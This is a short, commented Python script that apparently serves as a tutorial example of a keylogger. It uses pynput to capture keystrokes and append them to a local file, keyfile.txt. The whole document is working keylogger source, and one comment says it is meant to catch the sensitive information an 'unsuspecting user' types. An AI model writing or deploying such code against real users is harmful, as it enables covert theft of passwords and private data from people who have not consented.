from pynput import keyboard

def keyPressed(key):
    print(str(key)) # review what is being typed into the terminal 
    with open("keyfile.txt", 'a') as logkey: # opens a txt file to append the information being typed into a stored location (keyfile.txt)
        try:
            char = key.char # capture the individual character
            logkey.write(char) # writes the character into the file 
        except:
            print("Error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) # defines what the listener is responding to (keyboard actions) 
    listener.start() # starts capturing the keyboard presses
    input() # This is where the unsuspecting user would type along their sensitive information